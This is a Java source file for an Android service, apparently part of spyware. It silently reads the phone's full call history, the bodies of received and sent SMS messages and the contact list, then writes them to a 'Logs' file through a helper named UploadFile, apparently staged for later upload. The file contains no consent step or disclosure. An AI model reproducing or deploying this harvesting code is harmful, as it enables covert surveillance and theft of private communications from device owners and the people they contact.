package com.coding4fun.services;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import com.coding4fun.utils.UploadFile;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by coding4fun on 02-Nov-16.
 */

public class CallMsgLogs extends IntentService {


    public CallMsgLogs() {
        super("CallMsgLogs");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        String callLogs = getCallsLogs();
        String sentMSGsLogs = getSMSsLogs(false);
        String inboxMSGsLogs = getSMSsLogs(true);
        String contacts = getContacts();
        String content = "Call Logs:\n"+callLogs+"\n\nInbox SMSs:\n"+inboxMSGsLogs+"\n\nSent SMSs:\n"+sentMSGsLogs+"\n\nContacts:\n"+contacts;
        Log.e("GPA","Logs size: " + content.length());
        if (UploadFile.writeToFile(this,"Logs",content))
            Log.e("GPA","write logs to file: success");
        else
            Log.e("GPA","write logs to file: failed");
    }


    String getCallsLogs(){
        Cursor c = getContentResolver().query(Uri.parse("content://call_log/calls"),null,null,null,null);
        int number = c.getColumnIndex(CallLog.Calls.NUMBER);
        int name = c.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int type = c.getColumnIndex(CallLog.Calls.TYPE);
        int date = c.getColumnIndex(CallLog.Calls.DATE);
        int duration = c.getColumnIndex(CallLog.Calls.DURATION);
        String output = "";
        while(c.moveToNext()){
            output += "Name: " + c.getString(name) + "\n";
            output += "Number: " + c.getString(number) + "\n";
            output += "Duration: " + c.getString(duration) + "\n";
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm");
            output += "Date & time: " + formatter.format(new Date(c.getLong(date))) + "\n";
            String callType = "";
            switch (Integer.parseInt(c.getString(type))){
                case CallLog.Calls.OUTGOING_TYPE:
                    callType = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callType = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callType = "MISSED CALL";
                    break;
                default:
                    callType = "UNKNOWN!";
                    break;
            }
            output += "Type: " + callType + "\n";
            output += "\n";
        }
        c.close();
        return output;
    }

    String getSMSsLogs(boolean inbox){
        //inbox = true for inbox, false for sent
        String conProv = (inbox) ? "content://sms/inbox" : "content://sms/sent";
        Cursor c = getContentResolver().query(Uri.parse(conProv),null,null,null,null);
        int id = c.getColumnIndex("_id");
        int address = c.getColumnIndex("address");
        int date = c.getColumnIndex("date");
        int body = c.getColumnIndex("body");
        String output = "";
        while(c.moveToNext()){
            output += "ID: " + c.getString(id) + "\n";
            output += "Address: " + c.getString(address) + "\n";
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm");
            output += "Date & time: " + formatter.format(new Date(c.getLong(date))) + "\n";
            output += "Body:" + c.getString(body) + "\n";
            output += "\n";
        }
        c.close();
        return output;
    }

    String getContacts(){
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);
        int contactName = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
        int contactNumber = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
        String output = "";
        while(c.moveToNext()){
            output += c.getString(contactName) + "\t:\t" + c.getString(contactNumber) + "\n";
            //output += "\n";
        }
        c.close();
        return output;
    }
}